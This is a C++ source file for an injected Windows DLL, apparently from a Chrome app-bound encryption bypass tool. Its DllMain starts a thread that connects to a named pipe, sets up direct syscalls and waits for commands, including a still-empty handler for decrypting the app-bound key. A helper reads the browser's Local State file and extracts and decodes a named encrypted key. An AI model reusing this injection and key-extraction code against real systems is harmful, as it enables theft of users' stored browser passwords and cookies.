// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "../core/common.hpp"
#include "../sys/bootstrap.hpp"
#include "../sys/internal_api.hpp"
#include "pipe_client_ext.hpp"
#include "browser_config.hpp"
#include "data_extractor.hpp"
#include "fingerprint.hpp"
#include "../com/elevator.hpp"
#include "../core/logger.hpp"
#include <fstream>
#include <sstream>

using namespace Payload;

struct ThreadParams
{
    HMODULE hModule;
    LPVOID lpPipeName;
};

// Returns empty vector on failure, sets errorMsg if provided
std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path &localState, const std::string &keyName, std::string *errorMsg = nullptr)
{
    std::ifstream f(localState, std::ios::binary);
    if (!f)
    {
        if (errorMsg)
            *errorMsg = "Cannot open Local State";
        return {};
    }

    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

    std::string tag = "\"" + keyName + "\":\"";
    size_t pos = content.find(tag);
    if (pos == std::string::npos)
    {
        if (errorMsg)
            *errorMsg = "Key not found: " + keyName;
        return {};
    }

    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos)
    {
        if (errorMsg)
            *errorMsg = "Malformed JSON";
        return {};
    }

    std::string b64 = content.substr(pos, end - pos);

    DWORD size = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    if (size < 5)
    {
        if (errorMsg)
            *errorMsg = "Invalid key data (too small)";
        return {};
    }

    std::vector<uint8_t> data(size);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);

    // Skip first 4 bytes (version prefix)
    return std::vector<uint8_t>(data.begin() + 4, data.end());
}

std::string KeyToHex(const std::vector<uint8_t> &key)
{
    std::string hex;
    for (auto b : key)
    {
        char buf[3];
        sprintf_s(buf, "%02X", b);
        hex += buf;
    }
    return hex;
}

std::wstring KeyToHexW(const std::vector<uint8_t> &key)
{
    std::wstring hex;
    for (auto b : key)
    {
        wchar_t buf[3];
        swprintf_s(buf, L"%02X", b);
        hex += buf;
    }
    return hex;
}

// std::wstring KeyToHexW(const wchar_t *key, size_t length)
// {
//     std::wstring hex;
//     for (size_t i = 0; i < length; i++)
//     {
//         wchar_t buf[3];
//         swprintf_s(buf, L"%02X", static_cast<uint8_t>(key[i]));
//         hex += buf;
//     }
//     return hex;
// }

DWORD WINAPI PayloadThread(LPVOID lpParam)
{
    auto params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams *>(lpParam));
    LPCWSTR pipeName = static_cast<LPCWSTR>(params->lpPipeName);
    HMODULE hModule = params->hModule;
    Core::Logger logger(L"client2.log");
    logger.info(L"Payload thread started.");
    int retcode = -1;

    {
        PipeClient_EXT pipe(pipeName, logger);
        logger.info(L"Connecting to pipe...");
        pipe.connect();
        if (!pipe.is_valid())
        {
            logger.error(L"Failed to connect to pipe.");
            FreeLibraryAndExitThread(hModule, 0);
            return 1;
        }
        logger.info(L"Successfully connected to pipe.");

        // for (int i = 0; i < 5; i++) {
        //     pipe.send_text(L"Hello world " + std::to_wstring(i));
        //     Sleep(100); // Small delay between sending messages
        // }

        try
        {
            // Payload::request_msg* request = pipe.ReadRequest();
            if (!Sys::InitApi(true)) {
                pipe.send_text(L"Warning: Syscall initialization failed.");
            }
            logger.info(L"Syscall initialization succeeded.");
            logger.info(L"Starting to read from pipe...");
            retcode = pipe.read_utils(
                [&](int msg_type, const char *buffer, uint32_t size)
                {
                    try {
                        // Handle the incoming message here
                        if (msg_type == Core::PipeElement::kMessageType_Text)
                        {
                            std::wstring str(reinterpret_cast<const wchar_t *>(buffer), size / sizeof(wchar_t));
                            logger.info(L"Received TEXT: " + str);
                        } else if (msg_type == Core::PipeElement::kMessageType_Request)
                        {
                            Core::PipeElement::Request request(const_cast<char *>(buffer), size);
                            int command_id = request.get_command_id();
                            char* payload = request.get_payload();
                            int payload_size = request.get_payload_size();
                            logger.info(L"Received REQUEST for command ID: " + std::to_wstring(command_id));
                            logger.info(L"Payload size: " + std::to_wstring(payload_size));
                            logger.info(L"Payload (hex): " + Core::KeyToHexW(payload, payload_size));
                            std::vector<std::vector<char>> buffers = request.get_buffers();
                            logger.info(L"========================");
                            for (size_t i = 0; i < buffers.size(); ++i) {
                                std::wstring bufferStr(reinterpret_cast<const wchar_t *>(buffers[i].data()), buffers[i].size() / sizeof(wchar_t));
                                logger.info(L"Buffer " + std::to_wstring(i) + L" size: " + std::to_wstring(buffers[i].size()) + L", data: " + bufferStr);
                            }
                            if (command_id == Core::Constants::kMessageType_DecryptAppBoundEncryptedKey) {

                            }
                        }

                        return true; // Continue reading
                    } catch (const std::exception &e) {
                        logger.info(L"Exception caught while handling message: " + Core::ToWide(e.what()));
                        return false; // Stop reading on exception
                    }
                },
                10000
            );
        }
        catch (const std::exception &e)
        {
            logger.info(L"Exception caught: " + Core::ToWide(e.what()));
            pipe.send_text(L"[-] " + Core::ToWide(e.what()));
        }
    }

    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        // It leads to block IO such write to file ...
        DisableThreadLibraryCalls(hModule);
        auto params = new ThreadParams{hModule, lpReserved};
        HANDLE hThread = CreateThread(NULL, 0, PayloadThread, params, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
    }
    return TRUE;
}
